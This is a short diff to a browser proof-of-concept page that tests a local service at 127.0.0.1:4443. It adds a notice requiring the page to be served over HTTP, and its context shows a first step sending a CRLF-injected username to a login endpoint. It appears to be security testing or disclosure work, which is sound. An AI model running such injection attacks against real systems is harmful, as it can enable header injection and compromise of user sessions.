@@ -15,7 +15,7 @@
 <script>
 var BASE = 'https://127.0.0.1:4443';
 var el = document.getElementById('log');
-document.getElementById('org').textContent = location.origin;
+document.getElementById('org').textContent = (location.origin && location.origin !== 'null') ? location.origin : 'file:// (browser origin is null)';
 
 function log(msg, color) {
   var d = document.createElement('div');
@@ -48,6 +48,15 @@ function separator() {
 }
 
 async function run() {
+  if (location.protocol === 'file:') {
+    heading('[NOTICE]');
+    log('This PoC must be opened over HTTP(S), not as file://', '#f00');
+    log('Browsers set file:// pages to Origin: null, which breaks CORS and credential checks.', '#ff0');
+    log('Serve it with a local web server, for example: python3 -m http.server 8000', '#0ff');
+    log('Then open: http://localhost:8000/external-poc.html', '#0ff');
+    return;
+  }
+
   heading('[1] CRLF Injection — POST /login/ with payload');
   log('Sending CRLF-injected username from ' + location.origin + '...', '#ff0');
 
